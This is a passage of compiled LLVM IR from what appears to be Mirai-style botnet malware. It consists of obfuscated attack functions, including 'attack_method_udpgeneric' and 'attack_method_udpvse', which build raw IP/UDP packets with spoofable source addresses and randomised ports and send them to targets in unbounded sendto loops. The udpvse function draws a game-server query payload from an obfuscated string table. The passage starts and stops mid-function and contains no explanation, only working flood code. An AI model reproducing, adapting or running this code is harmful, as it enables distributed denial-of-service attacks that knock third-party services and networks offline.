  %827 = load %struct.sockaddr*, %struct.sockaddr** %826, align 8
  %828 = call i64 @sendto(i32 %811, i8* %812, i64 %817, i32 16384, %struct.sockaddr* %827, i32 16)
  br label %829

; <label>:829:                                    ; preds = %745
  %830 = load i32, i32* %9, align 4
  %831 = sub i32 %830, 1920763018
  %832 = add i32 %831, 1
  %833 = add i32 %832, 1920763018
  %834 = add nsw i32 %830, 1
  store i32 %833, i32* %9, align 4
  br label %708

; <label>:835:                                    ; preds = %708
  br label %707

; <label>:836:                                    ; preds = %223, %111, %105
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %363

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %363

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %203, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %210

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 -109, -1
  %111 = or i8 %108, %109
  %112 = or i8 -109, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = xor i8 %114, -1
  %117 = xor i8 64, -1
  %118 = xor i8 62, -1
  %119 = and i8 %116, 62
  %120 = and i8 %114, %118
  %121 = and i8 %117, 62
  %122 = and i8 64, %118
  %123 = or i8 %119, %120
  %124 = or i8 %121, %122
  %125 = xor i8 %123, %124
  %126 = or i8 %116, %117
  %127 = xor i8 %126, -1
  %128 = or i8 62, %118
  %129 = and i8 %127, %128
  %130 = or i8 %125, %129
  %131 = or i8 %114, 64
  store i8 %130, i8* %106, align 4
  %132 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %133 = bitcast %struct.iphdr* %132 to i8*
  %134 = load i8, i8* %133, align 4
  %135 = xor i8 %134, -1
  %136 = xor i8 -16, -1
  %137 = xor i8 1, -1
  %138 = or i8 %135, %136
  %139 = or i8 1, %137
  %140 = xor i8 %138, -1
  %141 = and i8 %140, %139
  %142 = and i8 %134, -16
  %143 = and i8 %141, 5
  %144 = xor i8 %141, 5
  %145 = or i8 %143, %144
  %146 = or i8 %141, 5
  store i8 %145, i8* %133, align 4
  %147 = load i8, i8* %12, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 1
  store i8 %147, i8* %149, align 1
  %150 = load i16, i16* %18, align 2
  %151 = zext i16 %150 to i64
  %152 = sub i64 0, %151
  %153 = sub i64 28, %152
  %154 = add i64 28, %151
  %155 = trunc i64 %153 to i16
  %156 = call zeroext i16 @htons(i16 zeroext %155) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 2
  store i16 %156, i16* %158, align 2
  %159 = load i16, i16* %13, align 2
  %160 = call zeroext i16 @htons(i16 zeroext %159) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 3
  store i16 %160, i16* %162, align 4
  %163 = load i8, i8* %14, align 1
  %164 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i32 0, i32 5
  store i8 %163, i8* %165, align 4
  %166 = load i8, i8* %15, align 1
  %167 = icmp ne i8 %166, 0
  br i1 %167, label %168, label %172

; <label>:168:                                    ; preds = %90
  %169 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %170 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 4
  store i16 %169, i16* %171, align 2
  br label %172

; <label>:172:                                    ; preds = %168, %90
  %173 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 6
  store i8 17, i8* %174, align 1
  %175 = load i32, i32* %20, align 4
  %176 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 8
  store i32 %175, i32* %177, align 4
  %178 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i32 0, i32 1
  %183 = load i32, i32* %182, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 9
  store i32 %183, i32* %185, align 4
  %186 = load i16, i16* %16, align 2
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  store i16 %187, i16* %189, align 2
  %190 = load i16, i16* %17, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = load i16, i16* %18, align 2
  %195 = zext i16 %194 to i64
  %196 = sub i64 0, %195
  %197 = sub i64 8, %196
  %198 = add i64 8, %195
  %199 = trunc i64 %197 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %202 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %201, i32 0, i32 2
  store i16 %200, i16* %202, align 2
  br label %203

; <label>:203:                                    ; preds = %172
  %204 = load i32, i32* %9, align 4
  %205 = sub i32 0, %204
  %206 = sub i32 0, 1
  %207 = add i32 %205, %206
  %208 = sub i32 0, %207
  %209 = add nsw i32 %204, 1
  store i32 %208, i32* %9, align 4
  br label %85

; <label>:210:                                    ; preds = %85
  br label %211

; <label>:211:                                    ; preds = %362, %210
  store i32 0, i32* %9, align 4
  br label %212

; <label>:212:                                    ; preds = %356, %211
  %213 = load i32, i32* %9, align 4
  %214 = load i8, i8* %5, align 1
  %215 = zext i8 %214 to i32
  %216 = icmp slt i32 %213, %215
  br i1 %216, label %217, label %362

; <label>:217:                                    ; preds = %212
  %218 = load i8**, i8*** %11, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds i8*, i8** %218, i64 %220
  %222 = load i8*, i8** %221, align 8
  store i8* %222, i8** %23, align 8
  %223 = load i8*, i8** %23, align 8
  %224 = bitcast i8* %223 to %struct.iphdr*
  store %struct.iphdr* %224, %struct.iphdr** %24, align 8
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i64 1
  %227 = bitcast %struct.iphdr* %226 to %struct.udphdr*
  store %struct.udphdr* %227, %struct.udphdr** %25, align 8
  %228 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i64 1
  %230 = bitcast %struct.udphdr* %229 to i8*
  store i8* %230, i8** %26, align 8
  %231 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %232 = load i32, i32* %9, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %231, i64 %233
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i32 0, i32 2
  %236 = load i8, i8* %235, align 4
  %237 = zext i8 %236 to i32
  %238 = icmp slt i32 %237, 32
  br i1 %238, label %239, label %262

; <label>:239:                                    ; preds = %217
  %240 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %243, i32 0, i32 1
  %245 = load i32, i32* %244, align 4
  %246 = call i32 @ntohl(i32 %245) #7
  %247 = call i32 @rand_next()
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %250
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %251, i32 0, i32 2
  %253 = load i8, i8* %252, align 4
  %254 = zext i8 %253 to i32
  %255 = lshr i32 %247, %254
  %256 = sub i32 0, %255
  %257 = sub i32 %246, %256
  %258 = add i32 %246, %255
  %259 = call i32 @htonl(i32 %257) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 9
  store i32 %259, i32* %261, align 4
  br label %262

; <label>:262:                                    ; preds = %239, %217
  %263 = load i32, i32* %20, align 4
  %264 = icmp eq i32 %263, -1
  br i1 %264, label %265, label %269

; <label>:265:                                    ; preds = %262
  %266 = call i32 @rand_next()
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 8
  store i32 %266, i32* %268, align 4
  br label %269

; <label>:269:                                    ; preds = %265, %262
  %270 = load i16, i16* %13, align 2
  %271 = zext i16 %270 to i32
  %272 = icmp eq i32 %271, 65535
  br i1 %272, label %273, label %278

; <label>:273:                                    ; preds = %269
  %274 = call i32 @rand_next()
  %275 = trunc i32 %274 to i16
  %276 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %277 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %276, i32 0, i32 3
  store i16 %275, i16* %277, align 4
  br label %278

; <label>:278:                                    ; preds = %273, %269
  %279 = load i16, i16* %16, align 2
  %280 = zext i16 %279 to i32
  %281 = icmp eq i32 %280, 65535
  br i1 %281, label %282, label %287

; <label>:282:                                    ; preds = %278
  %283 = call i32 @rand_next()
  %284 = trunc i32 %283 to i16
  %285 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %286 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %285, i32 0, i32 0
  store i16 %284, i16* %286, align 2
  br label %287

; <label>:287:                                    ; preds = %282, %278
  %288 = load i16, i16* %17, align 2
  %289 = zext i16 %288 to i32
  %290 = icmp eq i32 %289, 65535
  br i1 %290, label %291, label %296

; <label>:291:                                    ; preds = %287
  %292 = call i32 @rand_next()
  %293 = trunc i32 %292 to i16
  %294 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %295 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %294, i32 0, i32 1
  store i16 %293, i16* %295, align 2
  br label %296

; <label>:296:                                    ; preds = %291, %287
  %297 = load i8, i8* %19, align 1
  %298 = icmp ne i8 %297, 0
  br i1 %298, label %299, label %303

; <label>:299:                                    ; preds = %296
  %300 = load i8*, i8** %26, align 8
  %301 = load i16, i16* %18, align 2
  %302 = zext i16 %301 to i32
  call void @rand_str(i8* %300, i32 %302)
  br label %303

; <label>:303:                                    ; preds = %299, %296
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %304, i32 0, i32 7
  store i16 0, i16* %305, align 2
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = bitcast %struct.iphdr* %306 to i16*
  %308 = call zeroext i16 @checksum_generic(i16* %307, i32 20)
  %309 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %310 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %309, i32 0, i32 7
  store i16 %308, i16* %310, align 2
  %311 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %312 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %311, i32 0, i32 3
  store i16 0, i16* %312, align 2
  %313 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %314 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %315 = bitcast %struct.udphdr* %314 to i8*
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %316, i32 0, i32 2
  %318 = load i16, i16* %317, align 2
  %319 = load i16, i16* %18, align 2
  %320 = zext i16 %319 to i64
  %321 = sub i64 0, %320
  %322 = sub i64 8, %321
  %323 = add i64 8, %320
  %324 = trunc i64 %322 to i32
  %325 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %313, i8* %315, i16 zeroext %318, i32 %324)
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 3
  store i16 %325, i16* %327, align 2
  %328 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %329 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %328, i32 0, i32 1
  %330 = load i16, i16* %329, align 2
  %331 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %331, i64 %333
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i32 0, i32 0
  %336 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %335, i32 0, i32 1
  store i16 %330, i16* %336, align 2
  %337 = load i32, i32* %10, align 4
  %338 = load i8*, i8** %23, align 8
  %339 = load i16, i16* %18, align 2
  %340 = zext i16 %339 to i64
  %341 = sub i64 0, 28
  %342 = sub i64 0, %340
  %343 = add i64 %341, %342
  %344 = sub i64 0, %343
  %345 = add i64 28, %340
  %346 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %347 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 0
  %352 = bitcast %struct.sockaddr_in* %351 to %struct.sockaddr*
  store %struct.sockaddr* %352, %struct.sockaddr** %346, align 8
  %353 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %354 = load %struct.sockaddr*, %struct.sockaddr** %353, align 8
  %355 = call i64 @sendto(i32 %337, i8* %338, i64 %344, i32 16384, %struct.sockaddr* %354, i32 16)
  br label %356

; <label>:356:                                    ; preds = %303
  %357 = load i32, i32* %9, align 4
  %358 = sub i32 %357, -1567945427
  %359 = add i32 %358, 1
  %360 = add i32 %359, -1567945427
  %361 = add nsw i32 %357, 1
  store i32 %360, i32* %9, align 4
  br label %212

; <label>:362:                                    ; preds = %212
  br label %211

; <label>:363:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %343

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %343

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %199, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %205

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 %93, -1
  %95 = xor i8 15, -1
  %96 = xor i8 -61, -1
  %97 = or i8 %94, %95
  %98 = or i8 -61, %96
  %99 = xor i8 %97, -1
  %100 = and i8 %99, %98
  %101 = and i8 %93, 15
  %102 = and i8 %100, 64
  %103 = xor i8 %100, 64
  %104 = or i8 %102, %103
  %105 = or i8 %100, 64
  store i8 %104, i8* %92, align 4
  %106 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %107 = bitcast %struct.iphdr* %106 to i8*
  %108 = load i8, i8* %107, align 4
  %109 = xor i8 %108, -1
  %110 = xor i8 -16, -1
  %111 = xor i8 -79, -1
  %112 = or i8 %109, %110
  %113 = or i8 -79, %111
  %114 = xor i8 %112, -1
  %115 = and i8 %114, %113
  %116 = and i8 %108, -16
  %117 = xor i8 %115, -1
  %118 = xor i8 5, -1
  %119 = xor i8 -85, -1
  %120 = and i8 %117, -85
  %121 = and i8 %115, %119
  %122 = and i8 %118, -85
  %123 = and i8 5, %119
  %124 = or i8 %120, %121
  %125 = or i8 %122, %123
  %126 = xor i8 %124, %125
  %127 = or i8 %117, %118
  %128 = xor i8 %127, -1
  %129 = or i8 -85, %119
  %130 = and i8 %128, %129
  %131 = or i8 %126, %130
  %132 = or i8 %115, 5
  store i8 %131, i8* %107, align 4
  %133 = load i8, i8* %12, align 1
  %134 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i32 0, i32 1
  store i8 %133, i8* %135, align 1
  %136 = load i32, i32* %19, align 4
  %137 = sext i32 %136 to i64
  %138 = add i64 32, -7831050544212766552
  %139 = add i64 %138, %137
  %140 = sub i64 %139, -7831050544212766552
  %141 = add i64 32, %137
  %142 = trunc i64 %140 to i16
  %143 = call zeroext i16 @htons(i16 zeroext %142) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 2
  store i16 %143, i16* %145, align 2
  %146 = load i16, i16* %13, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %146) #7
  %148 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 3
  store i16 %147, i16* %149, align 4
  %150 = load i8, i8* %14, align 1
  %151 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i32 0, i32 5
  store i8 %150, i8* %152, align 4
  %153 = load i8, i8* %15, align 1
  %154 = icmp ne i8 %153, 0
  br i1 %154, label %155, label %159

; <label>:155:                                    ; preds = %73
  %156 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %157 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 4
  store i16 %156, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %155, %73
  %160 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 6
  store i8 17, i8* %161, align 1
  %162 = load i32, i32* @LOCAL_ADDR, align 4
  %163 = load %struct.iphdr*, %struct.iphdr** %20, align 8
